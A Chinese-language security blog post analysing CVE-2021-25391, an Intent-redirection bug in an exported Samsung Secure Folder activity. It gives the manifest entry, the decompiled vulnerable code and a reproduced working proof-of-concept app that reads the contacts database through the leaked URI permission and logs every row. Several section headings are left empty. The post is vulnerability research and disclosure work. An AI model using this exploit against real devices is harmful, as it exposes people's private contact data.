---
layout: post
title:  "[CVE-2021-25391] [Samsung] [Secure Folder] KnoxSettingCheckLockTypeActivity泄露Intent可获取ContentProvider数据"
date:   2022-11-20 18:00:00 +520
categories: Android_Security
tags: [AndroidApplication, LogicBug, ExportedComponent]
---

|    Date    | Version |     Description      |   Author    |
| :--------: | :-----: | :------------------: | :---------: |
| 2022.11.20 |   1.0   | 完整的漏洞分析与利用 | wnagzihxa1n |

## 0x00 漏洞概述

这个漏洞我没有完全自己挖出来，分析代码的时候我能感觉这个写法有问题，但一开始没有理解这个漏洞模型

三星手机系统的Secure Folder存在Intent泄露，合理构造Intent，可以获取到其权限

## 0x01 触发条件

| 上线日期 |    应用名     |             包名              |  版本号   |               MD5                | 下载链接 |
| :------: | :-----------: | :---------------------------: | :-------: | :------------------------------: | :------: |
|          | Secure Folder | com.samsung.knox.securefolder | 1.6.01.61 | 67bc4cec5ab436e1711cc98c43cc417e |          |

## 0x02 PoC

## 0x03 前置知识

## 0x04 Root Cause Analysis

组件`com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity`导出

```xml
<activity 
    android:exported="true" 
    android:launchMode="singleTask" 
    android:name="com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity" 
    android:resizeableActivity="false" 
    android:taskAffinity="com.samsung.knox.securefolder"/>
```

`[1]`将传入的Intent又发送了出去，所以我们就获取到了一个属于Secure Folder的Intent，合理构造这个Intent可以让攻击者获取到Secure Folder的权限

```java
// com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity
@Override  // android.app.Activity
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    Log.d(KnoxSettingCheckLockTypeActivity.TAG, "KnoxSettingCheckLockTypeActivity onCreate in overlay_post_container_v24");
    this.mChooseLockSettingshelper = new KnoxSettingsChooseLockSettingsHelper(this);
    int bundle = (((DevicePolicyManager)this.getSystemService("device_policy")).getKeyguardDisabledFeatures(null) & 16) == 0 ? 1 : 0;
    Log.d(KnoxSettingCheckLockTypeActivity.TAG, "KnoxSettingCheckLockTypeActivity onCreate come from trust agent. isAllowed: " + ((boolean)bundle));
    if(bundle != 0) {
        boolean z = this.mChooseLockSettingshelper.launchConfirmationActivity(0x409, null, null);
        Log.d(KnoxSettingCheckLockTypeActivity.TAG, "KnoxSettingCheckLockTypeActivity onCreate result: " + ((boolean)(((int)z))));
        return;
    }

    Log.d(KnoxSettingCheckLockTypeActivity.TAG, "KnoxSettingCheckLockTypeActivity onCreate send intent back");
    this.setResult(0, this.getIntent());  // [1]
    this.finish();
}
```

## 0x05 调试与利用

Oversecured实验室的PoC，我也是学到了很多

```java
protected void onCreate(Bundle savedInstanceState) {
   super.onCreate(savedInstanceState);

   Intent i = new Intent();
   i.setClassName("com.samsung.knox.securefolder", "com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity");
   i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
   i.setData(ContactsContract.RawContacts.CONTENT_URI);
   startActivityForResult(i, 0);
}

protected void onActivityResult(int requestCode, int resultCode, Intent data) {
   super.onActivityResult(requestCode, resultCode, data);

   dump(data.getData());
}

private void dump(Uri uri) {
   Cursor cursor = getContentResolver().query(uri, null, null, null, null);
   if (cursor.moveToFirst()) {
       do {
           StringBuilder sb = new StringBuilder();
           for (int i = 0; i < cursor.getColumnCount(); i++) {
               if (sb.length() > 0) {
                   sb.append(", ");
               }
               sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
           }
           Log.d("evil", sb.toString());
       }
       while (cursor.moveToNext());
   }
}
```

## 0x06 漏洞研究

## 0x07 References

《Two weeks of securing Samsung devices: Part 1》

- https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/

## 附录：调试过程记录

